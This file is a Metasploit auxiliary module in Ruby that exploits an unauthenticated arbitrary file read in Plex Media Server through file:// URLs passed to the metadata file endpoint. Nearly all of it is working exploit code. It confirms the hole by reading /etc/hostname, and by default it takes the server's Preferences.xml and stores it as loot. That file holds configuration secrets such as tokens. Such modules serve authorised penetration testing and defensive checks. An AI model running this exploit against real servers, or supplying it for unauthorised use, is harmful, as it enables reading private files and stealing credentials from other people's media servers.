##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Plex Media Server Metadata File Request Arbitrary File Read',
        'Description' => %q{
          Plex Media Server versions up to and including 1.43.3.10861 expose
          GET /library/metadata/<ratingKey>/file?url=<media-reference>. The handler
          resolves the caller-supplied media reference without validating its scheme or
          confining the resolved path to the item's metadata bundle directory. Supplying
          a file:// URL with an absolute path makes the server stream back any file
          readable by the PMS service account (often root on NAS/Docker installs).

          Fixed in 1.43.3.10896, which rejects references that are unsupported or that
          "escape the bundle directory".

          No authentication is required when the source IP is treated as an allowed
          network (default on unclaimed servers and common LAN configurations); an
          X-Plex-Token belonging to any user with library visibility works otherwise.
        },
        'Author' => [
          'h00die' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319'],
          # CVE not public yet
        ],
        'DisclosureDate' => '2026-09-01',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(32400),
        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),
        OptString.new('TOKEN', [false, 'X-Plex-Token for authentication (required on strict-auth servers)']),
        OptString.new('FILE', [false, 'Absolute path of the file to read', '']),
        OptString.new('RATINGKEY', [false, 'Metadata ratingKey to use (auto-discovered if unset)'])
      ]
    )
  end

  def token
    datastore['TOKEN'].to_s.empty? ? nil : datastore['TOKEN']
  end

  def headers
    h = { 'Accept' => '*/*' }
    h['X-Plex-Token'] = token if token
    h
  end

  def fingerprint
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'identity'),
      'headers' => headers
    })
    return nil unless res && res.code == 200

    res.get_xml_document.at_xpath('//MediaContainer/@version')&.text
  rescue StandardError => e
    vprint_error("Fingerprint failed: #{e.class} #{e.message}")
    nil
  end

  def find_rating_key
    key = datastore['RATINGKEY'].to_s
    return key unless key.empty?

    ['/library/all', '/library/onDeck', '/library/recentlyAdded'].each do |path|
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path + path),
        'headers' => headers,
        'vars_get' => { 'X-Plex-Container-Start' => 0, 'X-Plex-Container-Size' => 1 }
      })
      next unless res && res.code == 200

      match = res.body.match(/ratingKey="(\d+)"/)
      return match[1] if match
    end
    nil
  end

  def read_file(key, path)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'library', 'metadata', key.to_s, 'file'),
      'headers' => headers,
      'vars_get' => { 'url' => "file://#{path}" }
    })
    res
  end

  def check_host(_ip)
    version = fingerprint
    return Exploit::CheckCode::Unknown('Could not reach /identity') unless version

    vprint_status("Plex Media Server version: #{version}")

    key = find_rating_key
    return Exploit::CheckCode::Unknown('No metadata items visible (empty library or no access)') unless key

    res = read_file(key, '/etc/hostname')
    if res && res.code == 200
      vprint_good("Leaked /etc/hostname: #{res.body.strip}")
      return Exploit::CheckCode::Vulnerable("Confirmed file read via ratingKey #{key}")
    elsif res && res.code == 400
      return Exploit::CheckCode::Safe('Media reference rejected (patched, >= 1.43.3.10896)')
    end
    Exploit::CheckCode::Unknown("Unexpected response #{res ? res.code : 'none'}")
  end

  def run_host(_ip)
    version = fingerprint
    print_status("Version: #{version || 'unknown'}")

    key = find_rating_key
    unless key
      print_error('No metadata ratingKey available (library empty or token lacks access)')
      return
    end
    print_status("Using ratingKey #{key}")

    if datastore['FILE'].to_s.empty?
      files_to_read = [
        '/config/Library/Application Support/Plex Media Server/Preferences.xml',
        '/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Preferences.xml'
      ]
    else
      files_to_read = [datastore['FILE'].to_s]
    end

    files_to_read.each do |path|
      res = read_file(key, path)
      if res && res.code == 200
        loot = store_loot('plex.file', 'application/octet-stream', rhost, res.body, path, 'Plex Media Server file read')
        print_good("#{path} (#{res.body.length} bytes) saved to #{loot}")
        print_line(res.body) if res.body.length < 4096
      else
        code = res ? res.code : 'none'
        print_error("Failed to read #{path} (HTTP #{code})")
      end
    end
  end
end
